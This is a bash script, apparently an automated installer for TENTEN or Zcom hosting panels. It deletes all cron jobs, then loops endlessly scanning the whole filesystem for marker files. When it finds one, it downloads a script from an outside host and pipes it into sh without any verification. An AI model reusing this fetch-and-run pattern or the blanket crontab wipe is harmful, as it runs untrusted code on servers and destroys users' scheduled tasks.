#!/bin/bash
crontab -r
cat /home/404.txt || touch /home/404.txt && echo "1" >> /home/404.txt && echo "1" >> /home/404.txt
while :
	do
			dir1="$(find / -name "TENTENpanel.install")"
			dir2="$(find / -name "Zcompanel.install")"
		if [[ -f $dir1 ]]; then
			IPA=`ifconfig eth0 | grep 'inet' | awk '{print $2}'| head -1`
			cd /etc/auto/ && rm -rf /etc/auto/install_all_lastest_tenten || mkdir /etc/auto/
			curl -fsSL https://script.manhtuong.net/auto/install_all_lastest_tenten -o /etc/auto/install_all_lastest_tenten
			curl -fsSL http://$IPA/cPanel/login.php >/dev/null 2>&1 || sh /etc/auto/install_all_lastest_tenten < /home/404.txt
		elif [[ -f $dir2 ]]; then
			IPA=`ifconfig eth0 | grep 'inet' | awk '{print $2}'| head -1`
			cd /etc/auto/ && rm -rf /etc/auto/install_all_lastest_zcom || mkdir /etc/auto/
			curl -fsSL https://script.manhtuong.net/auto/install_all_lastest_zcom -o /etc/auto/install_all_lastest_zcom
			curl -fsSL http://$IPA/cPanel/login.php >/dev/null 2>&1 || sh /etc/auto/install_all_lastest_zcom < /home/404.txt
		else
			echo "1"
		fi
done
